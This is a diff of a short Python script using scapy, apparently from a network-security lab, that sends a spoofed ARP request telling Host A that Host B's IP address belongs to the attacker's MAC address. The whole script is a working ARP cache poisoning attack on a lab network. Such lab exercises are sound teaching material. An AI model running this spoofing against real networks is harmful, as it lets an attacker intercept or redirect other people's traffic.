@@ -1,5 +1,15 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 from scapy.all import *
+
+# Define the MAC and IP addresses
+MAC_M = "02:42:e4:e5:a8:08"  # MAC of Host M (Attacker)
+MAC_A = "02:42:0a:09:00:05"  # MAC of Host A (Victim 1)
+IP_B = "10.9.0.6"            # IP of Host B (Victim 2)
+IP_A = "10.9.0.5"            # IP of Host A (Victim 1)
+
+# Construct ARP packet
 E = Ether(src=MAC_M, dst=MAC_A)
 A = ARP(op=1, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A)
+
+# Send the packet on the network
 sendp(E/A, iface="eth0")
